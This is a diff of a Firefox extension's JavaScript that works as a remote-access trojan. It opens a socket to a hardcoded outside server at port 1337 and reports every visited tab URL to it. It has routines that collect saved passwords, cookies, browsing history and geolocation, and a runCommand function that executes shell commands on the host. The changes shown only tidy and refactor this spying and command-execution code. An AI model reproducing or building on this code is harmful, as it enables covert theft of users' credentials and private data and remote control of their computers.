@@ -2,7 +2,6 @@
 
 var server = "http://joshbalfour.co.uk:1337";
 
-
 require("tabs").on("ready", logURL);
   
 var passw = require("passwords");
@@ -19,16 +18,12 @@ var ioService=Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService
 var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"].getService(Ci.nsIScriptableInputStream);
 var cookieManager = Cc["@mozilla.org/cookiemanager;1"].getService(Ci.nsICookieManager);
 var xpcomGeolocation = Cc["@mozilla.org/geolocation;1"].getService(Ci.nsIDOMGeoGeolocation);
-var env = Cc["@mozilla.org/process/environment;1"].getService(Ci.nsIEnvironment);
-var process = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
-
-
 
 var socket = new io.socket(server, 
 function(data){ // function run where data receieved
     console.log("Receieved data: " + JSON.stringify(data)); //stringify and display the data
     
-    command = data[0];
+    command = parseInt(data[0]);
     args = data[1];
     
     var toSend=[""];
@@ -66,7 +61,6 @@ function(data){ // function run where data receieved
         sendDataAsync(command,toSend);
     }
     
-    
 },function(data){ // function run where connection closed
     console.log("Connection closed"); //Error out
 }).connect(function(result){
@@ -91,8 +85,6 @@ function logURL(tab) {
     data2= new Array(6,data);
     socket.write(data2);  
 }
-
-
 
 function getHistory()
 {
@@ -159,7 +151,6 @@ allCredentials = Array();
     });
 }
 
-
 function getCookies()
 {
     cookies = Array();      
@@ -177,11 +168,11 @@ function getCurrentPosition() {
     });  
 }
 
-
 // will return the result of the final command given. Put && instead of returns, otherwise it will probably screw things up.
 function runCommand(command){
     // don't ask..... just don't.
-
+    var env = Cc["@mozilla.org/process/environment;1"].getService(Ci.nsIEnvironment);
+    var process = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
     var fName = new Date();
     var file = Cc["@mozilla.org/file/directory_service;1"].
            getService(Ci.nsIProperties).
@@ -212,12 +203,9 @@ function runCommand(command){
     return stuff;
 }
 
-
-
 // pass in an nsILocalFile
 function Read(file)
 {
-
     var data = "";
     var fstream = Cc["@mozilla.org/network/file-input-stream;1"].
                   createInstance(Ci.nsIFileInputStream);
